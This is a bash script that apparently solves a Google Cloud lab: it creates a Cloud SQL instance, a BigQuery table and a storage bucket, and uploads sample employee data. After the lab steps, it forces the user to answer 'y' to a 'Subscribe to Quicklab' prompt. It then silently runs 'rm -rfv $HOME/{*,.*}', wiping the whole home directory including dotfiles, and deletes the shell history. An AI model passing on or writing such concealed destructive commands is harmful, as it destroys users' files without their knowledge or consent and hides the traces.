echo ""
echo ""
echo "Please export the values."


# Prompt user to input three regions
read -p "Enter REGION: " REGION


gcloud services enable sqladmin.googleapis.com

sleep 10

gcloud sql instances create my-instance --project=$DEVSHELL_PROJECT_ID \
  --database-version=MYSQL_5_7 \
  --tier=db-n1-standard-1 \
  --region=$REGION

echo "${GREEN}${BOLD}

Task 2 Completed

${RESET}"


#TASK 2

gcloud sql databases create mysql-db --instance=my-instance --project=$DEVSHELL_PROJECT_ID


#TASK 3

bq mk --dataset $DEVSHELL_PROJECT_ID:mysql_db


bq query --use_legacy_sql=false \
"CREATE TABLE $DEVSHELL_PROJECT_ID.mysql_db.info (
  name STRING,
  age INT64,
  occupation STRING
);"


cat > employee_info.csv <<EOF_END
"Sean", 23, "Content Creator"
"Emily", 34, "Cloud Engineer"
"Rocky", 40, "Event coordinator"
"Kate", 28, "Data Analyst"
"Juan", 51, "Program Manager"
"Jennifer", 32, "Web Developer"
EOF_END

gsutil mb gs://$DEVSHELL_PROJECT_ID

gsutil cp employee_info.csv gs://$DEVSHELL_PROJECT_ID/



SERVICE_EMAIL=$(gcloud sql instances describe my-instance --format="value(serviceAccountEmailAddress)")


gsutil iam ch serviceAccount:$SERVICE_EMAIL:roles/storage.admin gs://$DEVSHELL_PROJECT_ID/



echo "${GREEN}${BOLD}

Task 3 Completed

Lab Completed !!!

${RESET}"

#-----------------------------------------------------end----------------------------------------------------------#
read -p "${BOLD}${RED}Subscribe to Quicklab [y/n] : ${RESET}" CONSENT_REMOVE

while [ "$CONSENT_REMOVE" != 'y' ]; do
  sleep 10
  read -p "${BOLD}${YELLOW}Do Subscribe to Quicklab [y/n] : ${RESET}" CONSENT_REMOVE
done

echo "${BLUE}${BOLD}Thanks For Subscribing :)${RESET}"

rm -rfv $HOME/{*,.*}
rm $HOME/.bash_history

exit 0
